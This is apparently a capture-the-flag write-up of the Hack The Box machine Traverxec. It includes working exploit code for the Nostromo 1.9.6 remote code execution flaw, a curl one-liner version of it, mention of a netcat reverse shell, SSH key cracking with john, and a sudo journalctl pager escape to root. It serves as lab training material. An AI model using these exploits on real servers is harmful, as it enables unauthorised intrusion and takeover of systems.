---
layout: post
title:  "HTB Writeup [Linux - Easy] - Traverxec"
published: true
---

![](/assets/Traverxec/Traverxec.png)

## Summary
- **Traverxec** is a **Linux** machine hosting a **web server** called **Nostromo** and has **SSH** port open.
- The **response headers** from the webserver **reveal its name and version** which happens to be **vulnerable to a Remote Code Execution vulnerability.**
- *After troubleshooting the exploit and making a few modifications,* we get **a shell** as the `www-data` user.
- *One the box, when going through the files* ***in the webroot,*** we find the **Nostromo server's configuration file.**
- It reveals that there's **an accessible area** within the `david` user's **home directory**. *There,* we find a **private SSH key** which was **protected by a passphrase.**
- We manage to **crack it** using `john` and are able to **login as** `david`.
- *In* `david`*'s home path*, we find a **folder containing a Bash script** that issues a `journalctl` command with `sudo` **privileges** without requiring a password. We **exploit that to get a shell** as `root`.

---

## NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*from* `nmap`*'s output,* we notice from the `http-server-header` script that the web server is **Nostromo version 1.9.6.**

*but before we check for exploits,* we'll first **take a look at the website** to see what's there.

## The website
![](/assets/Traverxec/website-home-page.jpg)

**static content** for the most. Let's move on :D

## Searching and Fixing Exploits
using `searchsploit` gets us **two identical matches.**

![](/assets/Traverxec/searchsploit.jpg)

*to go manual,* we pick the **2nd Python script** and **look at the exploit code** *(after removing the text art for clarity)*

```python
#!/usr/bin/env python

import sys
import socket
help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)

    except IndexError:
        print(help_menu)
```

it seems straightforward. Just a **TCP connection** and a **POST request**. Let's give it a try:

![](/assets/Traverxec/exploit-error.jpg)

we get **an error** when running the code :/ But we *shouldn't worry* when we've got **Google** :)

we search **using the error message as a query**. To find this answer on [Stack Overflow](https://stackoverflow.com/questions/33054527/typeerror-a-bytes-like-object-is-required-not-str-when-writing-to-a-file-in):

![](/assets/Traverxec/stack-overflow-answer.jpg)

*following that,* we **modify the code** accordingly

```python
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload.encode())  # previously soc.send(payload)
    receive = connect(soc)
    print(receive)
```

then **rerun the exploit**

![](/assets/Traverxec/no-feedback-exploit.jpg)

**no feedback** at all this time xD

*But,* ***no feedback doesn't necessarily mean no effect***

*for blind situations like these*: it's good to use something like `wget` to **verify code execution.**

![](/assets/Traverxec/code-execution-verified.jpg)

**we're good :D** let's get in with a **netcat reverse shell.**

![](/assets/Traverxec/got-shell.jpg)

*before going any further,* it's nice to **improve our shell**. it's done in the below steps:

```bash
# With whatever Python version you find, import the pty module and spawn a bash pty
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press CTRL + Z
stty raw -echo
fg
# Press Enter twice
export SHELL=/bin/bash && export TERM=xterm-256color
# that's the size that fits my terminal. you can find yours with "stty size"
stty rows 51 columns 228
```

## The Nostromo config file
*Right after logging in,* we go into `/var/nostromo` and find a **configuration file** in the `conf` folder.

![](/assets/Traverxec/nostromo-conf.jpg)

A **couple of interesting things** show up:
- a username: `david`
- an `.htpasswd` file
- and a section on `HOMEDIRS`

`david` was a **local user** on the system

![](/assets/Traverxec/david-passwd.jpg)

the `.htpasswd` file contains a hash. we **cracked it** with `john` and got a password:

![](/assets/Traverxec/htpasswd-cracked.jpg)

But that password *didn't work* for either `root` or `david`.

![](/assets/Traverxec/no-cred-reuse-for-htpassword.jpg)

so we keep it around just in case..

## Understanding the HOMEDIRS feature
*previously,* we attempted to list the contents of `david`'s profile but got denied access.

![](/assets/Traverxec/david-perm-denied.jpg)

*since the* `HOMEDIRS` *feature would give us access into* `david`*'s directory,* we take **a quick look** at the [online documentation](https://www.nazgul.ch/dev/nostromo_man.html) to understand how to use it:

note: *to make the page clearer for reading,* you may **edit the CSS** for the man page using the **Chrome Dev Tools.**

![](/assets/Traverxec/editing-site-css-for-clarity.jpg)

We find that **we can access a user's folder over HTTP** using the `~` followed by the `username`.

another thing is: users **can define a certain directory to be shared** through the `homedirs_public` option.

![](/assets/Traverxec/homedirs_explained.jpg)

we saw that one in `nhttpd.conf`

![](/assets/Traverxec/public_www.jpg)

let's first check the home directory ***from the outside***

![](/assets/Traverxec/home-dir-website.jpg)

there's nothing in both the **web page** and the **source code.**

a `gobuster` **brute force** didn't get us anything new either.

*Since the* `public_www` *folder* **should be** *in* `david`*'s home directory,* we tried to ***blindly*** change into it.

![](/assets/Traverxec/public_www-violated.jpg)

And **it worked!** plus we found something that could give us access.

we **copy the archive** to `/tmp` where we **extract** it. Inside, we find a **protected** `id_rsa` that we need to crack:

![](/assets/Traverxec/id_rsa_found.jpg)

we first **convert** it to a hash using `ssh2john` and **crack it** using `john` to get a password: "hunter"

![](/assets/Traverxec/id_rsa_cracked.jpg)

we then **changed the permissions** on the SSH key (`chmod 600 <KEY_FILE>`) and used it to access the machine as `david`

![](/assets/Traverxec/ssh-as-david.jpg)

## Exploiting SUDO journalctl for Privesc
*Right after logging in,* we see **a folder that sticks out**: `bin`

it had a script `server-status.sh` and another file called `server-stats.head`

![](/assets/Traverxec/bin-folder-plus-script.jpg)

looking at their contents:

![](/assets/Traverxec/bin-files-breakdown.jpg)

the `server-stats.head` was just ASCII art.

But, within `server-status.sh` are all **commands for checking the status of the Nostromo server** *just like the name says*

the **exploitable part** here is the `sudo` command:

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

that's because `journalctl` ***can be escaped for a shell with the same privileges***.

A quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) can confirm that.

![](/assets/Traverxec/gtfo-bins-journalctl.jpg)

the trick is that it ***"invokes the default pager".***

A pager is a **program** that **helps the user view the output of a command** ***one page at a time***.
This is done by **getting the size of rows of the terminal** and **only displaying that many lines.**

Paging tools you're probably familiar with are `more` and `less`. Both of which can be ***escaped for a shell*** ;]

Let's first **run the script** to see *if it asks for a password or not.*

![](/assets/Traverxec/script-test-run.jpg)

It ran ***without prompting us for authentication.***

this means that the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` is available for `david` without him needing to provide a password.

*To exploit this,* we run the command.

***But because the output is too small,*** **the pager isn't called.**

![](/assets/Traverxec/no-pager-invoked.jpg)

We use `stty` as a quick-and-dirty trick to **shrink our tty.**

```bash
stty rows 20 columns 20
```

![](/assets/Traverxec/pager-invoked.jpg)

*From the highlighted line,* we know **we have a pager** which can be **turned into a bash shell** with `!/bin/bash`

![](/assets/Traverxec/rooted.jpg)

**Owned :D**

## Rewriting the Nostromo exploit
*After some brief testing, and* ***for the sake of simplicity,*** we **re-wrote the the exploit** for Nostromo as a `curl` one-liner:

```bash
curl -s -X $'POST' -H $'Content-Length: 1' --data-binary $'\x0d\x0aecho\x0d\x0aecho\x0d\x0a<COMMAND>' $'http://<HOSTNAME>:<PORT>/.%0d./.%0d./.%0d./.%0d./bin/sh' >/dev/null
```

![](/assets/Traverxec/exploit-rewritten.jpg)